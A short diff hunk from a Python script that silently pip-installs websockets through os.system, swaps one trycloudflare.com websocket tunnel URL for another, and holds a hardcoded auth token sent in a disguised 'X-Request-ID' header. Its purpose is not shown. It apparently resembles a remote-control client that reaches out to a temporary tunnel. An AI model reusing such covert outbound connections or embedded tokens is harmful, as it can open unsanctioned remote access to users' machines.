@@ -6,7 +6,7 @@ except ImportError:
     os.system("pip install websockets -q")
     import websockets
 
-WORKER_URL = "wss://nav-plane-simpson-experiments.trycloudflare.com/?r=l"
+WORKER_URL = "wss://sunday-jewelry-biggest-sets.trycloudflare.com/?r=l"
 AUTH_HEADER = "X-Request-ID"
 AUTH_TOKEN = "g0ivBa8uzZtHGioDOW7s"
 
